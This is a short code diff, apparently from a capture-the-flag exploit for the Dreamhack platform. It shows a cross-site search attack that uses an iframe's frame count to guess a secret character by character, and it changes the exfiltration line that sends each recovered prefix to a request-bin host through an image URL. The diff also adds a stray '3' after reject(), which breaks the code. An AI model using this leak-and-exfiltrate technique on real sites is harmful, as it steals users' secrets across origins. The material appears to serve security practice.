@@ -9,7 +9,7 @@
                 if (iframe.contentWindow.frames.length != 0)
                     return resolve();
                 else
-                    return reject();
+                    return reject();3
             };
         });
     }
@@ -30,7 +30,7 @@
             for (let c of chars) {
                 if (await search(secret + c)) {
                     secret += c;
-                    img.src = `https://kwmtwud.request.dreamhack.games/${secret}`;
+                    img.src = `https://tdikmvg.request.dreamhack.games/${secret}`;
                     break;
                 }
             }
